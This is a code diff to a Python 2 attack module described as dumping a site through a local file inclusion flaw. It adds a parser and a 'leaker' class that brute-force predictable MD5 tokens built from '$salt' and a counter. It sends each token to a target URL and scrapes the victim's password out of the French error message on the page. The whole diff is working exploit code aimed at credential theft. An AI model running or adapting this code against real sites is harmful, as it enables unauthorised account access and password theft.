@@ -6,6 +6,7 @@ Fantastic module that tries to dump a complete site using a LFI.
 Saves temporary the file using the urlencoded complete path and after
 all the dump rebuild the tree.
 '''
+import hashlib
 from lxml import etree
 import os
 import re
@@ -62,6 +63,34 @@ class MaraboutParser(Parser):
                 return (kind, data)
 
         return leak
+
+class MaraboutPasswordParser(Parser):
+    OK   = 1
+    FAIL = 2
+
+    def get_patterns(self):
+        return [
+            (MaraboutPasswordParser.OK, r'<span class="error">Votre mot de passe est : (.*)</span>'),
+            (MaraboutPasswordParser.FAIL, r'<span class="error">(Token non valable)</span>'),
+        ]
+
+    def get_leak(self, data):
+        for result, pattern in self.get_patterns():
+            p = re.compile(pattern, re.DOTALL|re.M)
+
+            finding = p.findall(data)
+
+            if len(finding) == 0:
+                continue
+
+            if result == MaraboutPasswordParser.OK:
+                password = finding[0]
+
+                return (MaraboutPasswordParser.OK, password)
+            else:
+                return (MaraboutPasswordParser.FAIL, None)
+
+
 
 WAITING  = 0
 EXPLORED = 1
@@ -169,3 +198,48 @@ class MaraboutLeaker(Leaker):
             src = self._path_from_output_dir(filepath)
             print '%s -> %s' % (src, real_path)
             os.rename(src, real_path)
+
+class MaraboutPasswordLeaker(Leaker):
+    def __init__(self, url, params={}, **kwargs):
+        super(MaraboutPasswordLeaker, self).__init__(**kwargs)
+
+        self.url = url
+
+        self.params   = params
+        self.index    = 100
+        self.password = None
+
+    def get_next_input_parameter(self):
+        md5 = hashlib.md5()
+        md5.update('$salt%s' % self.index)
+        return md5.hexdigest()
+
+    def input(self):
+        self.params.update({'token': self.get_next_input_parameter()})
+        response = requests.get(self.url, params=self.params)
+
+        return response.text
+
+    def update(self, leak):
+        result, password = leak
+
+        if result == MaraboutPasswordParser.OK:
+            self.password = password
+            raise LeakerEOS('password found: %s' % password)
+
+        self.index -= 1
+
+        if self.index == 0:
+            raise LeakerEOS('terminated attempts')
+
+        return result
+
+    def output(self, leak_piece):
+        sys.stdout.write('.')
+        sys.stdout.flush()
+
+    def on_exit(self):
+        if self.password:
+            print 'password found: \'%s\'' % self.password
+        else:
+            print 'password not found :('
